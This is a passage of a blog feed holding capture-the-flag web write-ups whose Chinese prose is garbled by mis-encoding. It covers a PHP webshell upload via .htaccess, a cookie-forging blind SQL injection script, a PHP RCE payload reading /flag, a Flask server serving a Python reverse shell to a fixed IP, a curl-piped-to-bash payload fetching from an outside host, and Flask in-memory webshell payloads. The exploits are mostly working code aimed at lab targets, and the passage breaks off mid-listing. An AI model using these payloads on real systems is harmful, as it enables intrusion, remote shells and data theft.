class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOD</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">displayInput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> inputText = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;input-text&quot;</span>).value;</span><br><span class="line">      document.<span class="title function_ invoke__">write</span>(inputText)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>é‡Œé¢æœ‰ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;upload.php&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload&quot;</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br></pre></td></tr></table></figure><p>è¦è¿›å…¥è¿™ä¸ªåŠŸèƒ½ç‚¹éœ€è¦æ»¡è¶³ <code>$isLocal</code>ä¸ºçœŸ</p><p>æ³¨æ„åˆ°è¿™ä¸ª<code>extract($_GET);</code></p><p>å¯ä»¥é€šè¿‡getä¼ å‚ç›´æ¥å»è¦†ç›–$_SERVER[â€˜REMOTE_ADDRâ€™]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$isLocal</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å…¶å®è¿™é‡Œä¹Ÿå®Œå…¨æ²¡å¿…è¦, ç›´æ¥ç»™æŠŠé‚£æ®µä¸Šä¼ çš„htmlä»£ç ç²˜è´´åˆ°ç½‘ç«™é‡Œç»™upload.phpä¸Šä¼ æ–‡ä»¶å°±è¡Œ, è¿™é‡Œæˆ‘ä»¬æ­£å¸¸åš</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526194419508.png" alt="image-20240526194419508" /><p>è¿™é‡Œä¸Šä¼ ä¸€ä¸ªphpæœ¨é©¬, ç›´æ¥å»uploadç›®å½•ä¸‹è®¿é—®æ˜¯ä¸ä¼šè§£æçš„, åŸå› æœªçŸ¥, ä¸€å¼€å§‹çŒœæµ‹æ˜¯ç”¨äº†file_get_contents, ä½†æ˜¯å½“æˆ‘å°è¯•ä¼ äº†ä¸€ä¸ª.htaccesså†è®¿é—®æ—¶å‘ç°403äº†</p><p>é‚£ä¹ˆæ„é€ .htaccessæŠŠpngè§£ææˆphp</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526194928431.png" alt="image-20240526194928431" /><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526195805665.png" alt="image-20240526195805665" /><p>ä¹‹åyijianè¿æ¥å³å¯</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526195921876.png" alt="image-20240526195921876" /><h2 id="EzLogin"><a href="#EzLogin" class="headerlink" title="EzLogin"></a>EzLogin</h2><p>è¿›å»çœ‹ç½‘ç«™æºç æœ‰ä¸€ä¸ªæç¤º&#x2F;register.html å¯ä»¥æ³¨å†Œç”¨æˆ·</p><p>å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å· abc&#x2F;123, å»ç™»å½•å¾—åˆ°ä¸€ä¸ªcookie, å¹¶ä¸”æç¤ºæˆ‘ä»¬ä¸æ˜¯admin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">65794a3163325679626d46745a534936496d46695979497349434a306232746c62694936496a6b774d4445314d446b344d324e6b4d6a526d596a426b4e6a6b324d3259335a4449345a5445335a6a637949697767496d6c7a5832466b62576c75496a6f7766513d3d</span><br></pre></td></tr></table></figure><p>ä¸€çœ¼hex, åé¢è¿˜æœ‰ä¸€å±‚base64</p><p>è§£ç å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;abc&quot;, &quot;token&quot;:&quot;900150983cd24fb0d6963f7d28e17f72&quot;, &quot;is_admin&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹è¿™ä¸ªis_adminä¸º1å†è®¿é—®, è¿™æ¬¡ä¼šå›æ˜¾æˆ‘ä»¬çš„å¯†ç , å½“æˆ‘ä»¬ä¸ºä¼ªé€ tokenä¸­çš„usernameä¸ºadminä¼šè¢«æ£€æµ‹åˆ°</p><p>å†çœ‹è¿™ä¸ªtoken,å¾ˆåƒmd5</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526201250853.png" alt="image-20240526201250853" /><p>è¿™ä¸ªå°±æ˜¯è´¦å·çš„md5</p><p>è¿™é‡Œæ¯”è¾ƒå‘å°±åœ¨äºä½ çš„usernameå¿…é¡»è¶³å¤Ÿç®€å•ä¸ç„¶å‘ç°ä¸äº†è¿™ä¸ª</p><p>é‚£ä¹ˆå°±å¯ä»¥æ›´æ”¹usernameå’Œmd5æ¥ä¼ªé€ tokenäº†</p><p>æ‰‹æ“å¾ˆéº»çƒ¦ , å†™ä¸ªè„šæœ¬æµ‹è¯•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">EncodeToken</span>(<span class="params">original_string</span>):</span><br><span class="line">    base64_encoded = base64.b64encode(original_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    hex_string = base64_encoded.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> hex_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DecodeToken</span>(<span class="params">hex_str</span>):</span><br><span class="line">    b64_str = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">    token_str = base64.b64decode(b64_str)</span><br><span class="line">    <span class="keyword">return</span> token_str.decode()</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚è¿™æ ·ä¸¤ä¸ªå‡½æ•°å³å¯</p><p>ä¹‹åä¼šå‘ç°usernameå…¶å®æœ‰ä¸€ä¸ªsqlæ³¨å…¥ å¸ƒå°”æ³¨å…¥</p><p>è¿‡æ»¤äº†ç©ºæ ¼ <code>&gt;</code> <code>&lt;</code> <code>between and</code>  </p><p>å¾ˆéš¾äºŒåˆ†, å¥½åœ¨æœåŠ¡å™¨æ¯”è¾ƒå¿«, ç›´æ¥çˆ†äº†</p><p>è´´ä¸€ä¸‹è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">input_string</span>):</span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(input_string.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge.qsnctf.com:30230/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EncodeToken</span>(<span class="params">original_string</span>):</span><br><span class="line">    base64_encoded = base64.b64encode(original_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    hex_string = base64_encoded.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> hex_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DecodeToken</span>(<span class="params">hex_str</span>):</span><br><span class="line">    b64_str = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">    token_str = base64.b64decode(b64_str)</span><br><span class="line">    <span class="keyword">return</span> token_str.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Register</span>(<span class="params">username, password</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url+<span class="string">&#x27;register.php&#x27;</span>, data=data)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Login</span>(<span class="params">username, password</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url+<span class="string">&#x27;login.php&#x27;</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># res = Register(username=username, password=password)</span></span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line"><span class="comment"># token = Login(username, password)[6:]</span></span><br><span class="line"><span class="comment"># token = DecodeToken(token)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># token_json = json.loads(token)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SendReq</span>(<span class="params">username</span>):</span><br><span class="line"></span><br><span class="line">    token_json = &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    token_json[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    user_hash = md5_hash(username)</span><br><span class="line">    token_json[<span class="string">&#x27;token&#x27;</span>] = user_hash</span><br><span class="line">    token_json[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    token_str = json.dumps(token_json)</span><br><span class="line">    TOKEN = EncodeToken(token_str)</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;TOKEN=&#x27;</span> + TOKEN</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url=url+<span class="string">&#x27;home.php&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sql = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># # dkctf  </span></span><br><span class="line"><span class="comment"># sql = &#x27;version()&#x27;</span></span><br><span class="line"><span class="comment"># # 10.5.23-MariaDB-0+deb11u1</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;select (table_name) from information_schema.tables where table_schema=database() limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># user  secret</span></span><br><span class="line">sql = <span class="string">&quot;select (column_name) from information_schema.columns where table_name=&#x27;secret&#x27; limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># flag sseeccrreett</span></span><br><span class="line">sql = <span class="string">&quot;select (sseeccrreett) from secret&quot;</span></span><br><span class="line"><span class="comment">#  # DRKCTF&#123;8b31c3a2f57b4de68124ac7734734944&#125;</span></span><br><span class="line"></span><br><span class="line">sql = sql.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">username =<span class="string">&quot;&#x27;or/**/ascii(substr(database(),1,1))=1#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    asc = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span>(asc &lt; <span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">&quot;&#x27;or/**/ascii(substr((&quot;</span> + sql + <span class="string">&quot;),&#123;&#125;,1))=&#123;&#125;#&quot;</span></span><br><span class="line">       <span class="comment"># print(payload.format(k, asc))</span></span><br><span class="line">        res = SendReq(payload.<span class="built_in">format</span>(k, asc))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hacker!!&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Hacker!!&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;No user found&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            asc = asc + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;@q^4*!z8a9-%42z.s~&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag = flag + <span class="built_in">chr</span>(asc)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text[-<span class="number">200</span>:])</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;ç­¾åˆ°&quot;&gt;&lt;a href=&quot;#ç­¾åˆ°&quot; class=&quot;headerlink&quot; title=&quot;ç­¾åˆ°&quot;&gt;&lt;/a&gt;ç­¾åˆ°&lt;/h</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://example.com/categories/WriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>H&amp;NCTF 2024 Web</title>
    <link href="http://example.com/2024/05/30/H-NCTF-2024-Web/"/>
    <id>http://example.com/2024/05/30/H-NCTF-2024-Web/</id>
    <published>2024-05-30T03:36:58.000Z</published>
    <updated>2024-05-30T05:41:48.716Z</updated>
    
    <content type="html"><![CDATA[<h1 id="H-NCTF-2024-WEB-å¤ç°"><a href="#H-NCTF-2024-WEB-å¤ç°" class="headerlink" title="H&amp;NCTF 2024 WEB å¤ç°"></a>H&amp;NCTF 2024 WEB å¤ç°</h1><p>èµ›ä¸­åªè§£å‡ºä¸¤é¢˜, å…¶ä»–çš„wpéƒ½è¿˜èƒ½çœ‹æ‡‚å·®ä¸å¤š, è¿™é‡Œå¤ç°ä¸€ä¸‹</p><h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>preg_match(&#39;/please_give_me_flag/&#39;,$str2)</code>è¿™é‡Œä¸å¿½ç•¥å¤§å°å†™, åé¢å¿½ç•¥å¤§å°å†™, æ•…ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://hnctf.imxbt.cn:46810/?moran=flag&amp;e=assert&amp;pass=system(&#x27;cat /flag&#x27;);</span><br><span class="line"></span><br><span class="line">flag=please_give_me_flaG&amp;task=register_shutdown_function($_REQUEST[&#x27;e&#x27;],$_REQUEST[&#x27;pass&#x27;])</span><br></pre></td></tr></table></figure><h2 id="ezFlask"><a href="#ezFlask" class="headerlink" title="ezFlask"></a>ezFlask</h2><p>æ¯”è¾ƒæŠ½è±¡çš„ä¸€é¢˜, è¿™é‡Œéé¢„æœŸè§£å‡ºæ¥äº†, </p><p>ä¸€å¼€å§‹æƒ³åˆ°çš„å°±æ˜¯dnså¤–å¸¦å¹¶ä¸”ä¹Ÿå¯ä»¥æˆåŠŸ, ä½†æ˜¯è¿™ä¸ªå®¹å™¨å¤ªæŠ½è±¡äº†, æ‰§è¡Œä¸€æ¬¡å°±å¾—é‡å¼€</p><p>ä¸‹é¢è¯´è¯´æˆ‘çš„æ–¹æ³•,</p><p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“è¿™é‡Œç¦ç”¨äº†å¾ˆå¤šå‘½ä»¤</p><p>ç”±äºå®¹å™¨æ¯”è¾ƒå¥‡è‘©, fuzzçš„æˆæœ¬å¤ªé«˜äº†, è¿™é‡Œåªfuzzå‡ºæ¥curlå‘½ä»¤æ˜¯å¯ä»¥æ‰§è¡Œçš„, å¹¶ä¸”<code>$ </code> <code>|</code>è¿™ä¸¤ä¸ªç¬¦å·ä¹Ÿæ˜¯å¯ä»¥ç”¨çš„,æ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯æŠŠè¿œç«¯çš„æ¶æ„shellå‘½ä»¤curlä¸‹æ¥é€šè¿‡ç®¡é“æ”¾è¿›<code>$0</code>,ä¹Ÿå°±æ˜¯æ”¾è¿›å½“å‰æ‰§è¡Œçš„è„šæœ¬(bash), è¾¾åˆ°åå¼¹shellçš„ç›®çš„</p><p>é¦–å…ˆvpsèµ·ä¸€ä¸ªæœåŠ¡, ç”¨æ¥è¿”å›pythonåå¼¹shellè„šæœ¬ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;107.148.75.202&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>ä¹‹åncç›‘å¬ 7777ç«¯å£</p><p>å‘é€æ‰§è¡Œcurlå‘½ä»¤çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;os&quot;).popen(&quot;curl www.n4c1.top:5000/ |$0&quot;).read()</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥çš„åˆ°shell, ç„¶åå°±æ˜¯è¯»æºç æ‹¿flag</p><p>çœ‹æ­£è§£æ˜¯pythonå†…å­˜é©¬, ä¹‹å‰å¥½åƒæ¥è§¦è¿‡ä¸€æ¬¡, æ²¡ä»€ä¹ˆå°è±¡, å­¦ä¹ äº†</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p><p>å¤§æ¦‚å°±æ˜¯é€šè¿‡evalçš„ä»»æ„ä»£ç æ‰§è¡Œ, ä¸ºflaskå½“å‰appæ·»åŠ ä¸€æ¡è·¯ç”±, å¹¶å°†å…¶ä¸æ¶æ„æ“ä½œå‡½æ•°ç»‘å®š, ä¸Javaçš„tomcatå†…å­˜é©¬ç›¸ä¼¼, æ­¤æ“ä½œæ— æ–‡ä»¶è½åœ°, é€šè¿‡ä¿®æ”¹ä¸­é—´ä»¶æ¥è·å–shell</p><p>ç½‘ä¸Šå¯ä»¥æœåˆ°å¾ˆå¤špayload</p><p>è¿™é‡Œåˆ—å‡ºä¸¤æ¡å¸ˆå‚…ä»¬wpé‡Œçš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:__import__(&#x27;os&#x27;).popen(&quot;cat</span><br><span class="line">/flag&quot;).read())</span><br><span class="line"></span><br><span class="line">xÂ cmd=render_template_string(&quot;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;)</span><br></pre></td></tr></table></figure><p>ä¹‹åè®¿é—®æˆ‘ä»¬æ·»åŠ çš„shellè·¯ç”±å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/shell</span><br><span class="line"></span><br><span class="line">æˆ–</span><br><span class="line"></span><br><span class="line">/shell?cmd=cat%20/flag</span><br></pre></td></tr></table></figure><h2 id="GoJava"><a href="#GoJava" class="headerlink" title="GoJava"></a>GoJava</h2><p>robots.txtä¸­æ³„éœ²äº†ç½‘ç«™æºç çš„å¤‡ä»½</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 